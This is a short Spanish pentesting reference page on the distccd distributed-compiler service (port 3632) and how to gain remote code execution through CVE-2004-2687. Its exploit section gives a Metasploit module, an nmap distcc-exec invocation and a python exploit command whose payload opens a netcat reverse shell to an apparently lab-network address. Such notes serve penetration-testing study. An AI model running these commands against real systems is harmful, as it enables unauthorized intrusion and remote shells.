---
description: Compilador distribuido y como utilizarlo para ganar RCE.
---

# 3632 -DISTCCD

## INFORMACIÓN BÁSICA

`Distccd` es el servidor del compilador distribuido de Linux. Acepta trabajos de compilación provenientes de los equipos de la red. Puede correr sobre una conexión TCP (rápida pero insegura) o sobre SSH (lenta pero segura).

```
PORT     STATE SERVICE
3632/tcp open  distccd
```

## EXPLOIT

Podemos utilizar este servicio para ejecutar código Remoto (RCE). [**CVE-2004-2687**](https://www.incibe-cert.es/alerta-temprana/vulnerabilidades/cve-2004-2687)**.**

Se puede explotar utilizando un módulo de Metasploit, un script de nmap o incluso un script de python:

### Metasploit

```
msf5 > use exploit/unix/misc/distcc_exec
```

### nmap

```
nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"
```

### python

Podemos encontrar el código en el siguiente enlace.

{% embed url="https://nippycodes.com/coding/cve-2004-2687-distcc-daemon-command-execution-python" %}

```
./disccd_exploit.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"
```
